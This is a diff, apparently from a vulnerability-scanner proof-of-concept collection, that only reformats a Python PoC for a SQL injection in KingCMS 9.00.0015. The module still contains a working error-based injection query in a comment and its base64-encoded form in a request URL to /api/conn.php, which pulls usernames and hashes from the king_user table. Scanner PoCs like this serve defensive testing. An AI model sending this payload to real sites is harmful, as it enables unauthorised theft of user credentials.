@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'KingCMS_0002' # 平台漏洞编号，留空
+    vuln_id = 'KingCMS_0002'  # 平台漏洞编号，留空
     name = 'KingCMS 绕过过滤SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-03-11'  # 漏洞公布时间
     desc = '''
         KingCMS 9.00.0015版 未过滤了/**/ 导致SQL注入漏洞。
@@ -31,8 +32,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #SELECT username FROM king_user UNION SELECT 1 FROM(/**/SELECT COUNT(*),CONCAT(0x23,(/**/SELECT concat(username,0x23,md5(c))FROM king_user LIMIT 0,1),0x23,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)a
+
+            # SELECT username FROM king_user UNION SELECT 1 FROM(/**/SELECT COUNT(*),CONCAT(0x23,(/**/SELECT concat(username,0x23,md5(c))FROM king_user LIMIT 0,1),0x23,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)a
             payload = "/api/conn.php?USERID=MTAwMDA%3D&data=U0VMRUNUIHVzZXJuYW1lIEZST00ga2luZ191c2VyIFVOSU9OIFNFTEVDVCAxIEZST00oLyoqL1NFTEVDVCBDT1VOVCgqKSxDT05DQVQoMHgyMywoLyoqL1NFTEVDVCBjb25jYXQodXNlcm5hbWUsMHgyMyxtZDUoYykpRlJPTSBraW5nX3VzZXIgTElNSVQgMCwxKSwweDIzLEZMT09SKFJBTkQoMCkqMikpeCBGUk9NIElORk9STUFUSU9OX1NDSEVNQS50YWJsZXMgR1JPVVAgQlkgeClh&jsoncallback=jsonp1426001109856&SIGN=9e64da1bfad93ed03ac42e0522cad92d&_=1426001137223"
             url = self.target + payload
             r = requests.get(url)
@@ -46,6 +47,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
